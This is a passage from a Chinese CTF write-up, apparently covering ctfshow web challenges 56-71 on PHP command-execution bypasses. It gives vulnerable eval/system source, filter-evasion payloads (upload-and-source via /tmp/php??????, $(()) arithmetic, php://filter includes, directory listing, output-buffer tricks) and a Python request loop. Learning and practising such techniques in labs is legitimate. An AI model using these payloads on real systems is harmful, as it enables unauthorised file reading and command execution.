requests.post(url=url2,files=<span class="hljs-keyword">file</span>)<br></code></pre></td></tr></table></figure>

<p>然后用蚁剑连接即可</p>
<p>或者直接输出答案到python</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;http://25a61f1e-6750-49d2-a671-7bce2a18c52b.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;</span><br>    r = requests.post(url, files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;mixbp.txt&#x27;</span>,<span class="hljs-string">&#x27;cat flag.php&#x27;</span>)&#125;)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ctfshow&quot;</span> <span class="hljs-keyword">in</span> r.<span class="hljs-built_in">text</span>:<br>        print(r.<span class="hljs-built_in">text</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-56（无字母数字RCE）"><a href="#web-56（无字母数字RCE）" class="headerlink" title="web-56（无字母数字RCE）"></a>web-56（无字母数字RCE）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>无字母数字RCE</p>
<p>过滤了字母数字，%号，杜绝取反和异或；$，杜绝转义，看了其他大神的wp，总结出下面的方法：</p>
<p>可以通过POST上传一个文件，文件中包含命令，通过source命令（.）来执行命令，该文件在linux下面保存在 <strong>&#x2F;tmp&#x2F;php??????</strong> ，后六个字符为随机生成的大小写，可使用linux匹配符去匹配。</p>
<p>可以通过构造post上传文件的数据包，或者使用python脚本：</p>
<p>（1）数据包</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;[传参网站]&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>传入参数 <strong>?c&#x3D;.%20&#x2F;???&#x2F;????????[@-[]</strong></p>
<p>在文件内容中写入命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> /var/www/html/falg.php<br></code></pre></td></tr></table></figure>

<p>2）python脚本</p>
<p>同样的思路。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;[自定义网站]/?c=.+/???/????????[@-[]&quot;</span><br>    r = requests.post(url, files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;feng.txt&#x27;</span>, <span class="hljs-string">b&#x27;cat flag.php&#x27;</span>)&#125;)<br>    <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&quot;flag&quot;</span>) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(r.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h2 id="web-57（无数字字母RCE构造数字）"><a href="#web-57（无数字字母RCE构造数字）" class="headerlink" title="web-57（无数字字母RCE构造数字）"></a>web-57（无数字字母RCE构造数字）</h2><p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 还能炫的动吗？</span><br><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>未过滤$、取反~和左右括号()，提示flag在36.php中，文件名为数字，且程序会直接cat到指定文件内容，需要给c赋值为36。</p>
<p>可使用Bash shell中的双小括号(())来进行构造数字：</p>
<ul>
<li>$(()) 代表一次运算，括号内可以填入运算式，因为里面为空，所以结果会被解析为0</li>
<li>对0取反可以得到-1，使用表达式表示为$(( ~$(()) ))</li>
<li>两个双小括号运算符相连，默认为相加，如$(( $(~$(())) $(( ~$(()))) )) ，-1+(-1)&#x3D;-2</li>
<li>通过上述方法我们可以构造出-37，又-37取反得到36，目的达成，在$(( ~$((    )) ))中放入37个$(( ~$(()) ))，即可构造出数字36</li>
</ul>
<p>python脚本得到payload：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">payload = <span class="hljs-string">&quot;<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>((&#123;&#125;))))&quot;</span>.format(<span class="hljs-string">&quot;<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))&quot;</span>*<span class="hljs-number">37</span>)<br>print(payload)<br><br><span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>((<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))<span class="hljs-variable">$</span>((~<span class="hljs-variable">$</span>(())))))))<br><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-58（命令执行突破禁用函数、include加伪协议读取文件、highlight-file-、show-source-）"><a href="#web-58（命令执行突破禁用函数、include加伪协议读取文件、highlight-file-、show-source-）" class="headerlink" title="web-58（命令执行突破禁用函数、include加伪协议读取文件、highlight_file()、show_source()）"></a>web-58（命令执行突破禁用函数、include加伪协议读取文件、highlight_file()、show_source()）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过include绕过过滤 本题对于passthru，system等命令执行函数都禁用了。eval在php里面是执行代码层面的函数，无法直接执行linux命令。因此为了绕过过滤就使用include加伪协议绕过、或者使用highlight_file()函数或者show_source()函数直接读取flag.php。</p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">post：<br>include加伪协议<br>POST传参：<span class="hljs-attribute">c</span>=include($_POST[<span class="hljs-string">&#x27;w&#x27;</span>]);&amp;<span class="hljs-attribute">w</span>=php://filter/convert.base64-encode/resource=flag.php<br><br>highlight_file()<br>POST传参：<span class="hljs-attribute">c</span>=highlight_file(&quot;flag.php&quot;);<br><br>show_source()<br><span class="hljs-attribute">c</span>=show_source(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-59（命令执行突破禁用函数）"><a href="#web-59（命令执行突破禁用函数）" class="headerlink" title="web-59（命令执行突破禁用函数）"></a>web-59（命令执行突破禁用函数）</h2><p>跟上题一样</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">POST传参：<span class="hljs-attribute">c</span>=highlight_file(&quot;flag.php&quot;);<br>POST传参：<span class="hljs-attribute">c</span>=include($_POST[<span class="hljs-string">&#x27;w&#x27;</span>]);&amp;<span class="hljs-attribute">w</span>=php://filter/convert.base64-encode/resource=flag.php<br>或者<br><span class="hljs-attribute">c</span>=include <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;<br>POST传参：<span class="hljs-attribute">c</span>=show_source(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-60（命令执行突破禁用函数、扫描当前目录）"><a href="#web-60（命令执行突破禁用函数、扫描当前目录）" class="headerlink" title="web-60（命令执行突破禁用函数、扫描当前目录）"></a>web-60（命令执行突破禁用函数、扫描当前目录）</h2><p>应该也过滤了些函数，但是不知道过滤了啥，试了下file_get_contents被过滤了，但是上题的payload都能用，这里用一下扫描当前目录的payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">先扫描一下文件: <span class="hljs-attribute">c</span>=print_r(scandir(dirname(&#x27;FILE&#x27;)));<br><span class="hljs-attribute">c</span>=print_r(scandir(dirname(&#x27;.&#x27;)));<br>发现flag.php<br><br>然后读取flag.php，有以下几种方法<br>POST传参：<span class="hljs-attribute">c</span>=highlight_file(&quot;flag.php&quot;);<br>POST传参：<span class="hljs-attribute">c</span>=include($_POST[<span class="hljs-string">&#x27;w&#x27;</span>]);&amp;<span class="hljs-attribute">w</span>=php://filter/convert.base64-encode/resource=flag.php<br><span class="hljs-attribute">c</span>=include <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;<br>POST传参：<span class="hljs-attribute">c</span>=show_source(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-61-64（同上）"><a href="#web-61-64（同上）" class="headerlink" title="web-61-64（同上）"></a>web-61-64（同上）</h2><hr>
<h2 id="web-65（无参数文件读取、include文件包含配合echo输出flag）"><a href="#web-65（无参数文件读取、include文件包含配合echo输出flag）" class="headerlink" title="web-65（无参数文件读取、include文件包含配合echo输出flag）"></a>web-65（无参数文件读取、include文件包含配合echo输出flag）</h2><p>这里用一下无参数文件读取和include包含加echo输出得到flag</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">无参数文件读取<br><span class="hljs-attribute">c</span><span class="hljs-operator">=</span>show_source(next(array_reverse(scandir(pos(localeconv())))))<span class="hljs-comment">;</span><br><br>include文件包含然后echo输出flag<br><span class="hljs-attribute">c</span><span class="hljs-operator">=</span>include(<span class="hljs-string">&quot;flag.php&quot;</span>)<span class="hljs-comment">;echo $flag;</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-66（根目录扫描、php原生类）"><a href="#web-66（根目录扫描、php原生类）" class="headerlink" title="web-66（根目录扫描、php原生类）"></a>web-66（根目录扫描、php原生类）</h2><p>源码还是一样，但是我们读取目录下的flag.php然后发现flag不在，所以这次我们得扫描下根目录，然后再读取</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs llvm">查看根目录内容<br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>))<span class="hljs-comment">;</span><br>或<br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>print_r(scandir(dirname(&#x27;.&#x27;)))<span class="hljs-comment">;</span><br>或<br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>var_dump(scandir(&#x27;/&#x27;))<span class="hljs-comment">;</span><br>或<br>新思路：PHP原生类可遍历目录 <span class="hljs-keyword">c</span><span class="hljs-operator">=</span>$dir<span class="hljs-operator">=</span>new DirectoryIterator(<span class="hljs-string">&quot;/&quot;</span>)<span class="hljs-comment">;echo $dir; (url编码：</span><br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%24</span>dir<span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span>DirectoryIterator(<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>aforeach(<span class="hljs-variable">%24</span>dir<span class="hljs-variable">%20</span>as<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>f)<span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>echo(<span class="hljs-variable">%24</span>f.&#x27;<span class="hljs-variable">%3</span>cbr<span class="hljs-variable">%3</span>e&#x27;)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%7</span>d)<br>扫描发现一个flag.txt<br><br><br>查看文件内容<br>POST传参：<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br>POST传参：<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>include($_POST[&#x27;w&#x27;])<span class="hljs-comment">;&amp;w=php://filter/convert.base64-encode/resource=/flag.txt</span><br>POST传参：<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;../../../../../flag.txt&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-67（命令执行突破禁用函数）"><a href="#web-67（命令执行突破禁用函数）" class="headerlink" title="web-67（命令执行突破禁用函数）"></a>web-67（命令执行突破禁用函数）</h2><p>试了一下发现print_r()和show_source()被禁用了，用var_dump代替print_r，</p>
<p>highlight_file读取</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm">查看根目录<br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>var_dump(scandir(&#x27;/&#x27;))<span class="hljs-comment">;</span><br>或者<br>php原生类<span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%24</span>dir<span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span>DirectoryIterator(<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>aforeach(<span class="hljs-variable">%24</span>dir<span class="hljs-variable">%20</span>as<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>f)<span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>echo(<span class="hljs-variable">%24</span>f.&#x27;<span class="hljs-variable">%3</span>cbr<span class="hljs-variable">%3</span>e&#x27;)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%7</span>d<br><br>读取文件<br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;../../../../../flag.txt&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span>include($_POST[&#x27;w&#x27;])<span class="hljs-comment">;&amp;w=php://filter/convert.base64-encode/resource=/flag.txt</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-68（命令执行突破禁用函数、readgzfile、splFileobject-fpassthru）"><a href="#web-68（命令执行突破禁用函数、readgzfile、splFileobject-fpassthru）" class="headerlink" title="web-68（命令执行突破禁用函数、readgzfile、splFileobject-&gt;fpassthru）"></a>web-68（命令执行突破禁用函数、readgzfile、splFileobject-&gt;fpassthru）</h2><p>这里点开发现highlight_file被禁用了，依然可以使用var_dump结合scandir来显示根目录的文件列表，然后这里可以用include和require</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">查看根目录内容<br><span class="hljs-attribute">c</span>=var_dump(scandir(&quot;/&quot;));<br><br>查看文件内容<br>POST传参：<br><span class="hljs-attribute">c</span>=include($_POST[<span class="hljs-string">&#x27;w&#x27;</span>]);&amp;<span class="hljs-attribute">w</span>=php://filter/convert.base64-encode/resource=/flag.txt<br><span class="hljs-attribute">c</span>=var_dump((new SplFileObject(<span class="hljs-string">&quot;/flag.txt&quot;</span>))-&gt;fpassthru());<br><span class="hljs-attribute">c</span>=readgzfile(&quot;/flag.txt&quot;);<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-69（命令执行突破禁用函数、implode、var-export、json-encode）"><a href="#web-69（命令执行突破禁用函数、implode、var-export、json-encode）" class="headerlink" title="web-69（命令执行突破禁用函数、implode、var_export、json_encode）"></a>web-69（命令执行突破禁用函数、implode、var_export、json_encode）</h2><p>implode函数：将数组转换成字符串再打印</p>
<p>var_export：类似var_dump</p>
<p>json_encode() 函数：将数组转换为 JSON 格式的字符串，可以用于在前端或其他系统中传递和处理数组数据。</p>
<p>解题思路：</p>
<p><strong>前面几题用到的打印数组函数 print_r() 和 var_dump() 已被禁用，但是还有几种能打印数组的函数</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">查看根目录内容<br><span class="hljs-attribute">c</span>=echo json_encode(scandir(<span class="hljs-string">&quot;/&quot;</span>)); <br><span class="hljs-attribute">c</span>=echo(implode(&quot;--&quot;,scandir(&quot;/&quot;)));<br><span class="hljs-attribute">c</span>=var_export(scandir(&quot;/&quot;));<br><br>查看文件内容<br>POST传参：<br><span class="hljs-attribute">c</span>=readgzfile(&#x27;/flag.txt&#x27;);<br><span class="hljs-attribute">c</span>=include($_POST[<span class="hljs-string">&#x27;w&#x27;</span>]);&amp;<span class="hljs-attribute">w</span>=php://filter/convert.base64-encode/resource=/flag.txt<br><span class="hljs-attribute">c</span>=include(&quot;/flag.txt&quot;);<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-70（同上）"><a href="#web-70（同上）" class="headerlink" title="web-70（同上）"></a>web-70（同上）</h2><p>上一关的var_export等函数依然可用</p>
<hr>
<h2 id="web-71（正则替换绕过、提前送出缓冲区或终止程序、ob-flush-、ob-end-flush、exit、die）"><a href="#web-71（正则替换绕过、提前送出缓冲区或终止程序、ob-flush-、ob-end-flush、exit、die）" class="headerlink" title="web-71（正则替换绕过、提前送出缓冲区或终止程序、ob_flush()、ob_end_flush、exit、die）"></a>web-71（正则替换绕过、提前送出缓冲区或终止程序、ob_flush()、ob_end_flush、exit、die）</h2><p>我们首先使用上一题的查看根目录的payload发现，输出全是?，猜测是源码内有替换语句。</p>
<p>分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br></code></pre></td></tr></table></figure>

<p>源码劫持了输出缓冲并且将数字和字母替换成了<code>?</code>。</p>
<p>payload：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<span class="hljs-keyword">exit</span>();<br>法一<br>在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有：<br>ob_flush();<br>ob_end_flush();<br>payload示例：<br>c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);ob_flush();<br><br>法二<br>提前终止程序，即执行完代码直接退出，可以调用的函数有：<br><span class="hljs-keyword">exit</span>();<br>die();<br>payload示例：<br>c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure>

<hr>
